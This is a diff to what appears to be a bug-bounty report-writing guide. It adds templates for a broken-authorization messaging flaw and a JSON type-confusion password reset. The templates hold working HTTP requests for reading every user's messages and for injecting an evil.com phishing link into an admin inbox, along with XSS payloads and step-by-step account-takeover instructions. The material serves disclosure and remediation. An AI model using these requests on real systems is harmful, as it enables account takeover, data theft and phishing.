@@ -45,7 +45,9 @@ tags:
   - time-based-reporting
   - xxe-disclosure-reporting
   - cloud-metadata-reporting
-version: "3.0"
+  - access-control-bounty-reference
+  - type-confusion-reporting
+version: "3.1"
 author: mahipal
 license: Apache-2.0
 nist_csf:
@@ -277,6 +279,127 @@ requested userId for anomaly detection.
 - [x] Sample extracted data (PII redacted — show structure only)
 - [x] Video demonstrating enumeration (accessing 5 different profiles)
 - [x] CVSS 3.1 vector: AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N
+```
+
+### BOLA Messaging/Inbox — Report Template
+
+**Pattern: internal messaging API with broken object-level authorization. GET returns all messages across users; POST accepts arbitrary `toUser` without ownership validation. Combined read + write BOLA on messaging is the highest-impact IDOR variant — enables mass phishing and XSS delivery.**
+
+**Title**: `[BOLA] Internal Messaging API allows unauthorized cross-user message read and injection`
+
+```markdown
+### Summary
+
+The `/system/v1/message` endpoint lacks object-level authorization checks.
+Any authenticated user can:
+
+1. Read all internal messages across every user in the system
+2. Inject arbitrary HTML content into any user's inbox by specifying `toUser`
+
+### Steps to Reproduce
+
+#### Step 1: Authenticate as a low-privilege user
+
+```http
+POST /oauth/login HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+
+grant_type=password&username=test63&password=xxx&tenant_name=shijiutilitiestest
+
+HTTP/1.1 200 OK
+{"access_token":"3cbadd0e-...","token_type":"bearer","expires_in":43199,"scope":"app"}
+```
+
+#### Step 2: Read all messages across users (Read BOLA)
+
+```http
+GET /system/v1/message HTTP/1.1
+Authorization: Bearer 3cbadd0e-...
+
+HTTP/1.1 200 OK
+{
+  "total": 117,
+  "data": [
+    {"toUser":"admin",   "content":"<img/src=x/onerror=alert(1)>", ...},
+    {"toUser":"test66",  "content":"Internal configuration note...", ...},
+    {"toUser":"michal.kedzior", "content":"{{constructor.constructor(...)...", ...},
+    ...
+  ]
+}
+```
+
+**Finding**: The endpoint returns all 117 messages across 4+ different users
+despite the token belonging to `test63`. Query filters (`userId`, `toUser`) are
+ignored — all messages are returned regardless.
+
+#### Step 3: Inject message into admin's inbox (Write BOLA)
+
+```http
+POST /system/v1/message HTTP/1.1
+Content-Type: application/json
+Authorization: Bearer 3cbadd0e-...
+
+{"toUser":"admin","content":"<a href=\"https://evil.com/phish\">⚠️ Your session expired. Click to re-authenticate.</a>","type":"1","method":"internal"}
+
+HTTP/1.1 200 OK
+db0da84b-caff-4d10-ba25-45db3401a77b  ← message ID (injection confirmed)
+```
+
+#### Step 4: Verify injection — admin now sees the attacker's message
+
+```http
+GET /system/v1/message?toUser=admin HTTP/1.1
+Authorization: Bearer 3cbadd0e-...
+
+→ Returns message with content: "⚠️ Your session expired. Click to re-authenticate."
+```
+
+{Attach screenshots showing the message in the admin's inbox UI}
+
+### Impact
+
+- **Read BOLA**: Any authenticated user can read all private messages, support
+  tickets, and administrative alerts across every user in the system
+- **Write BOLA**: Attacker can inject HTML content into any user's inbox,
+  enabling stored XSS, credential harvesting forms, and phishing campaigns
+- **Audit Gap**: `fromUser` is `null` on injected messages — no sender
+  attribution or forensics trail
+- **Scale**: One compromised low-privilege account can reach every user
+- **XSS Chaining**: Messages render HTML/JS in the recipient's browser context
+  (confirmed with `<img/src=x/onerror=alert(1)>` in admin's inbox)
+
+### Remediation
+
+**1. Add server-side authorization for GET:** Filter returned messages to only
+those where `toUser == currentUser.username`.
+
+**2. Reject cross-user POSTs:** In the POST handler, either:
+- Reject requests where `toUser != currentUser.username` (user-to-self only), or
+- Populate `fromUser` from the authenticated session server-side and allow
+  user-to-user with audit trail.
+
+**3. Sanitize message content:** Strip HTML from message bodies or use strict
+content escaping to prevent XSS delivery via inbox.
+
+### CVSS 3.1
+
+**Vector**: AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N → **8.1 (Critical)**
+
+Rationale: Low privileges (any auth token), changed scope (access other users'
+data), high confidentiality (read all messages), high integrity (inject content
+into any inbox), no availability impact.
+
+### CWE
+
+- CWE-639: Authorization Bypass Through User-Controlled Key
+- CWE-284: Improper Access Control
+
+### Supporting Evidence
+
+- [x] Read BOLA: enumerated messages for 4+ distinct recipients from test63 token
+- [x] Write BOLA: injected messages into admin and test66 inboxes from test63 token
+- [x] XSS chaining: HTML/JS payloads rendered in victim inboxes
+- [x] Verified `fromUser` is `null` on injected messages (no attribution)
 ```
 
 ### Step 4: Platform-Specific Formatting
@@ -702,6 +825,46 @@ Login: administrator / ocmss1s4a2dp2l6r9tgd → Admin panel → Full privilege e
 | Low | 3.0-4.9 | $50-$500 | Hardcoded test credentials in source |
 ```
 **Reporting pattern**: Redact actual passwords but show hash format (APR1, bcrypt, MD5). If crackable, state the hash type and cracking feasibility. Include hashcat command for verification.
+
+### Access Control / Authorization Bypass
+
+**519+ disclosed reports — the #1 vulnerability category by volume. Top bounties: GitLab password reset $35K, Valve CD key theft $20K, GitHub SSH cert bypass $10K, Reddit proxy access $7.5K.**
+
+| Severity | CVSS | Bounty Range | Real Example |
+|----------|------|-------------|--------------| 
+| Critical | 9.0-10.0 | $10K-$35K | GitLab: JSON type confusion in password reset → ATO ($35K) |
+| High | 7.0-8.9 | $1K-$10K | GitHub: SSH cert auth bypass on gist ($10K) |
+| Medium | 5.0-6.9 | $200-$3K | GitLab: file:// protocol import of local repos ($22.3K) |
+| Low | 3.0-4.9 | $50-$1K | CORS, subdomain takeover, missing rate limits |
+
+**Report template for JSON type confusion (H1 #2293343 pattern)**:
+
+```markdown
+## Access Control Bypass — JSON Parameter Type Confusion
+
+**CVSS**: 10.0 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
+
+### Summary
+The password reset endpoint accepts JSON input where single-value fields can be
+substituted with arrays. Converting `email` from a string to an array of two 
+addresses routes the reset token to ALL array elements — including the attacker's
+email. No user interaction required beyond knowing the victim's email address.
+
+### Steps to Reproduce
+1. Navigate to https://target.com/forgot-password
+2. Enter victim's email, intercept the POST request in proxy
+3. Convert Content-Type to application/json
+4. Replace {"user[email]":"victim@gmail.com"} with:
+   {"user":{"email":["victim@gmail.com","attacker@gmail.com"]}}
+5. Forward — reset link arrives at BOTH emails
+6. Click reset link, set new password, log in as victim
+
+### Impact
+- Full account takeover of any user given only their email address
+- No user interaction required (victim receives email but unaware of reset)
+- Bypasses all authentication — email is the only verification factor
+- Cannot be detected by the victim (attacker resets password silently)
+```
 
 ### XSS — When to Report vs. Move On
 ```
